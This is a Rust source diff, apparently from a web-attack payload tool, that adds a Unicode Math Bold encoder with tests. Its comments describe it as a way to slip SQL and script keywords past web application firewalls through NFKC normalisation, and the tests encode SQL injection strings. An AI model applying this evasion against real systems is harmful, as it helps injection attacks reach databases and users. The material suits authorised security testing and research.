@@ -176,6 +176,48 @@ pub fn fullwidth_encode(payload: &str) -> String {
     out
 }
 
+/// Mathematical Alphanumeric Symbols encoding — replaces ASCII letters and
+/// digits with their Math-Bold counterparts in the Unicode `U+1D400` block.
+///
+/// `A`–`Z` → `U+1D400`–`U+1D419` (Math Bold Capitals: 𝐀 𝐁 … 𝐙)
+/// `a`–`z` → `U+1D41A`–`U+1D433` (Math Bold Smalls:   𝐚 𝐛 … 𝐳)
+/// `0`–`9` → `U+1D7CE`–`U+1D7D7` (Math Bold Digits:   𝟎 𝟏 … 𝟗)
+/// Everything else is passed through unchanged (punctuation, spaces, etc.,
+/// keep working as SQL/HTML syntax).
+///
+/// **Bypass mechanism**: every codepoint in this range NFKC-normalises back
+/// to its plain-ASCII counterpart. Databases / frameworks that perform NFKC
+/// normalisation (`PostgreSQL` with ICU collations, `MySQL`
+/// `utf8mb4_0900_ai_ci`, Java `Normalizer.normalize(s, NFKC)`, Python
+/// `unicodedata.normalize('NFKC', s)`, Go `golang.org/x/text/unicode/norm`)
+/// see the original `SELECT` / `UNION` / `script` keyword and execute /
+/// render it. WAFs scanning bytes for ASCII keywords see codepoints in the
+/// `U+1D400` block — no keyword match.
+///
+/// **Distinct from `fullwidth_encode`**: fullwidth uses the `U+FF00`
+/// Halfwidth-and-Fullwidth-Forms block. Math Alphanumeric uses the
+/// `U+1D400` block — different code range, different WAF coverage gap.
+/// WAFs that block fullwidth (a common technique since 2020) often do not
+/// also block Math Alphanumeric Symbols. Both encode-paths NFKC to ASCII.
+///
+/// **Context**: any target whose backend NFKC-normalises before parsing.
+/// Confirmed targets: `PostgreSQL` ICU + `MySQL` `utf8mb4_0900_ai_ci`
+/// SQL identifiers, Java/Spring Boot path matching, .NET `String.Normalize`.
+#[must_use]
+pub fn math_bold_encode(payload: &str) -> String {
+    let mut out = String::with_capacity(payload.len() * 4);
+    for ch in payload.chars() {
+        let mapped = match ch {
+            'A'..='Z' => char::from_u32(0x1D400 + (ch as u32 - 'A' as u32)).unwrap_or(ch),
+            'a'..='z' => char::from_u32(0x1D41A + (ch as u32 - 'a' as u32)).unwrap_or(ch),
+            '0'..='9' => char::from_u32(0x1D7CE + (ch as u32 - '0' as u32)).unwrap_or(ch),
+            c => c,
+        };
+        out.push(mapped);
+    }
+    out
+}
+
 /// Homoglyph substitution — replaces select ASCII characters with visually
 /// identical Unicode characters from other scripts.
 ///
@@ -366,6 +408,73 @@ mod tests {
             html_entity_variants("hello world"),
             html_entity_variants("hello world")
         );
+    }
+
+    // ── math_bold_encode tests ─────────────────────────────────────────
+
+    #[test]
+    fn math_bold_encode_uppercase() {
+        assert_eq!(math_bold_encode("A"), "\u{1D400}"); // 𝐀
+        assert_eq!(math_bold_encode("Z"), "\u{1D419}"); // 𝐙
+    }
+
+    #[test]
+    fn math_bold_encode_lowercase() {
+        assert_eq!(math_bold_encode("a"), "\u{1D41A}"); // 𝐚
+        assert_eq!(math_bold_encode("z"), "\u{1D433}"); // 𝐳
+    }
+
+    #[test]
+    fn math_bold_encode_digits() {
+        assert_eq!(math_bold_encode("0"), "\u{1D7CE}"); // 𝟎
+        assert_eq!(math_bold_encode("9"), "\u{1D7D7}"); // 𝟗
+    }
+
+    #[test]
+    fn math_bold_encode_sql_keyword() {
+        // SELECT → 𝐒𝐄𝐋𝐄𝐂𝐓
+        let encoded = math_bold_encode("SELECT");
+        assert_eq!(encoded.chars().count(), 6);
+        for ch in encoded.chars() {
+            assert!(
+                (0x1D400..=0x1D419).contains(&(ch as u32)),
+                "expected math bold capital, got U+{:04X}",
+                ch as u32
+            );
+        }
+    }
+
+    #[test]
+    fn math_bold_encode_preserves_punctuation() {
+        // ' OR 1=1-- — only letters/digits transform; punctuation stays
+        let encoded = math_bold_encode("' OR 1=1--");
+        // ' space = = - - all unchanged
+        assert!(encoded.starts_with('\''));
+        assert!(encoded.contains('='));
+        assert!(encoded.ends_with("--"));
+    }
+
+    #[test]
+    fn math_bold_encode_mixed_alphanumeric() {
+        let encoded = math_bold_encode("Aa0");
+        // A → 𝐀, a → 𝐚, 0 → 𝟎
+        let chars: Vec<char> = encoded.chars().collect();
+        assert_eq!(chars.len(), 3);
+        assert_eq!(chars[0] as u32, 0x1D400);
+        assert_eq!(chars[1] as u32, 0x1D41A);
+        assert_eq!(chars[2] as u32, 0x1D7CE);
+    }
+
+    #[test]
+    fn math_bold_encode_distinct_from_fullwidth() {
+        // Fullwidth uses U+FF00 block; math bold uses U+1D400 block
+        // The same input must produce different bytes (proving they're not equivalent).
+        assert_ne!(math_bold_encode("SELECT"), fullwidth_encode("SELECT"));
+    }
+
+    #[test]
+    fn math_bold_encode_empty() {
+        assert_eq!(math_bold_encode(""), "");
     }
 
     #[test]
